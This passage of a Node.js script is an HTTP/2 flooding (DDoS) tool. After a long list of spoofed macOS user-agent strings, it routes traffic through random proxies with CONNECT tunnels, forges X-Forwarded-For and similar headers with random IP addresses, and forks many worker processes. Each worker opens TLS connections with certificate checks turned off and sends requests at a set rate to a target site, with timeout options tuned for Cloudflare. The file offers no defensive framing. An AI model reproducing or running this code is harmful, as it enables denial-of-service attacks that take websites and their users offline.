  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
];

const ip_spoof = () => {
  const ip_segment = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
};
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload =
      "CONNECT " +
      options.address +
      ":443 HTTP/1.1\r\nHost: " +
      options.address +
      ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", (chunk) => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", (error) => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const Socker = new NetSocket();
headers[":method"] = randomMethod;
headers[":path"] =
  parsedTarget.path +
  pathts[Math.floor(Math.random() * pathts.length)] +
  "&" +
  randomString(10) +
  queryString +
  randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders["Content-Type"];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders["x-download-options"];
headers["Cross-Origin-Embedder-Policy"] =
  randomHeaders["Cross-Origin-Embedder-Policy"];
headers["Cross-Origin-Opener-Policy"] =
  randomHeaders["Cross-Origin-Opener-Policy"];
headers["accept"] = randomHeaders["accept"];
headers["accept-language"] = randomHeaders["accept-language"];
headers["Referrer-Policy"] = randomHeaders["Referrer-Policy"];
headers["x-cache"] = randomHeaders["x-cache"];
headers["Content-Security-Policy"] = randomHeaders["Content-Security-Policy"];
headers["accept-encoding"] = randomHeaders["accept-encoding"];
headers["cache-control"] = randomHeaders["cache-control"];
headers["x-frame-options"] = randomHeaders["x-frame-options"];
headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["pragma"] = randomHeaders["pragma"];
headers["sec-ch-ua-platform"] = randomHeaders["sec-ch-ua-platform"];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders["sec-fetch-dest"];
headers["sec-fetch-mode"] = randomHeaders["sec-fetch-mode"];
headers["sec-fetch-site"] = randomHeaders["sec-fetch-site"];
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = randomHeaders["sec-ch-ua"];
headers["sec-ch-ua-mobile"] = randomHeaders["sec-ch-ua-mobile"];
headers["vary"] = randomHeaders["vary"];
headers["x-requested-with"] = "XMLHttpRequest";
headers["set-cookie"] = randomHeaders["set-cookie"];
headers["Server"] = randomHeaders["Server"];
headers["strict-transport-security"] =
  randomHeaders["strict-transport-security"];
headers["access-control-allow-headers"] =
  randomHeaders["access-control-allow-headers"];
headers["access-control-allow-origin"] =
  randomHeaders["access-control-allow-origin"];
headers["Content-Encoding"] = randomHeaders["Content-Encoding"];
headers["alt-svc"] = randomHeaders["alt-svc"];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const userAgentv2 = new UserAgent();
  var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = uap1;

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 1000,
  };

  setTimeout(function () {
    process.exit(1);
  }, process.argv[3] * 1000);

  process.on("uncaughtException", function (er) {});
  process.on("unhandledRejection", function (er) {});

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 100000);

    const tlsOptions = {
      ALPNProtocols: ["h2"],
      challengesToSolve: Infinity,
      resolveWithFullResponse: true,
      followAllRedirects: true,
      maxRedirects: 10,
      clientTimeout: 5000,
      clientlareMaxTimeout: 10000,
      cloudflareTimeout: 5000,
      cloudflareMaxTimeout: 30000,
      ciphers: tls.getCiphers().join(":") + cipper,
      secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
      servername: url.hostname,
      socket: connection,
      honorCipherOrder: true,
      secureOptions:
        crypto.constants.SSL_OP_NO_RENEGOTIATION |
        crypto.constants.SSL_OP_NO_TICKET |
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_NO_RENEGOTIATION |
        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
        crypto.constants.SSL_OP_TLSEXT_PADDING |
        crypto.constants.SSL_OP_ALL |
        crypto.constants.SSLcom,
      sigals: concu,
      echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
      secure: true,
      Compression: false,
      rejectUnauthorized: false,
      port: 443,
      uri: parsedTarget.host,
      servername: parsedTarget.host,
      sessionTimeout: 5000,
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.setKeepAlive(true, 60 * 10000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 20000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const request = client
            .request(headers)

            .on("response", (response) => {
              request.close();
              request.destroy();
              return;
            });

          request.end();
        }
      }, 1000);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });

    client.on("error", (error) => {
      client.destroy();
      connection.destroy();
      return;
    });
  });
}
